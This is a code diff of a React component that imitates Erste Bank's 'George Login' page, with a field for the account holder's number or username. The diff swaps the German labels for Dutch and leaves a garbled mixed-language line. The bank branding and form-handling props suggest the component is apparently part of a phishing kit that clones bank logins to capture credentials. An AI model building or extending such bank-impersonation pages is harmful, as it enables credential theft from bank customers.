@@ -47,8 +47,8 @@ export function ErsteBank({ formData, onChange, handleRouteAction, saving }: Pro
             <h1 className="text-[#0f2c59] text-[22px] font-bold mb-6 text-center">George Login</h1>
 
             <p className="text-[#4a5568] text-[14px] leading-relaxed mb-6 self-start">
-              Bitte geben Sie Ihre Verfügernummer oder<br />
-              Ihren selbst gewählten Benutzernamen<br />
+              Voer uw inlogcode in of<br />
+              Ihren selbst gewählten Gebruikersnaamn<br />
               ein.
             </p>
 
@@ -62,7 +62,7 @@ export function ErsteBank({ formData, onChange, handleRouteAction, saving }: Pro
                 <input 
                   type="text" 
                   required
-                  placeholder="Verfügernummer/Benutzername"
+                  placeholder="Inlogcode/Gebruikersnaam"
                   value={formData.verfuegernummer || ""}
                   onChange={(e) => onChange("verfuegernummer", e.target.value)}
                   className="w-full h-[44px] border border-[#cbd5e0] rounded-[8px] pl-10 pr-4 outline-none focus:border-[#2d68ff] focus:ring-1 focus:ring-[#2d68ff] text-[#2d3748] placeholder-[#a0aec0] text-[14px] transition-all"
